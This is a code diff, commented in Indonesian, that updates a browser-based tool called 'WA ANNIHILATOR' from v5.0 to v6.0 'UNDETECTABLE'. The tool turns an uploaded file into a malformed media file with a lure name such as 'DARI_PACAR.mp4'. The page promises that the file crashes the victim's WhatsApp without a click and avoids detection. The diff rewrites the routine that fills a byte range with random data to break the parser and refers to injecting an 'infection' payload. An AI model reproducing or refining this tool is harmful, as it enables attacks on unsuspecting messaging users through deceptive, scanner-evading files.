@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>WA ANNIHILATOR v5.0 - FINAL</title>
+  <title>WA ANNIHILATOR v6.0 - UNDETECTABLE</title>
   <style>
     * {
       margin: 0;
@@ -99,10 +99,10 @@
 </head>
 <body>
   <div class="container">
-    <h1>☠️ WA ANNIHILATOR v5.0</h1>
-    <h2>FINAL MODE - SILENT KILL</h2>
+    <h1>☠️ WA ANNIHILATOR v6.0</h1>
+    <h2>UNDETECTABLE - SILENT KILL</h2>
     <p class="subtitle">
-      File terlihat normal, lolos scan, dikirim langsung. Korban tidak perlu klik — WA crash otomatis.
+      File terlihat normal, tidak terdeteksi, tidak muncul peringatan. Korban tidak perlu klik — WA crash otomatis.
     </p>
 
     <div class="form-group">
@@ -124,7 +124,7 @@
       <input type="text" id="customName" placeholder="Masukkan nama menarik" value="DARI_PACAR.mp4" />
     </div>
 
-    <button onclick="generateFinalPayload()">🔥 GENERATE & DOWNLOAD</button>
+    <button onclick="generateUndetectablePayload()">🔥 GENERATE & DOWNLOAD</button>
 
     <pre id="result"></pre>
 
@@ -145,7 +145,7 @@
       document.getElementById('customName').value = names[type];
     });
 
-    function generateFinalPayload() {
+    function generateUndetectablePayload() {
       const file = document.getElementById('inputFile').files[0];
       const fileType = document.getElementById('fileType').value;
       const customName = document.getElementById('customName').value.trim() || "video.mp4";
@@ -175,10 +175,13 @@
           }
         }
 
-        // === 2. Corrupt bagian dalam (parser crash) ===
-        for (let i = 50; i < 150; i++) {
-          if (i % 4 === 0) arr[i] = 0xFF;
-          if (i % 3 === 0) arr[i] = 0x00;
+        // === 2. Corrupt bagian tengah (parser crash) ===
+        const corruptStart = 500; // Mulai dari byte ke-500
+        const corruptLength = 100;
+        for (let i = corruptStart; i < corruptStart + corruptLength; i++) {
+          if (i < arr.length) {
+            arr[i] = Math.floor(Math.random() * 256); // Random bytes
+          }
         }
 
         // === 3. Inject payload akhir (infeksi backup) ===
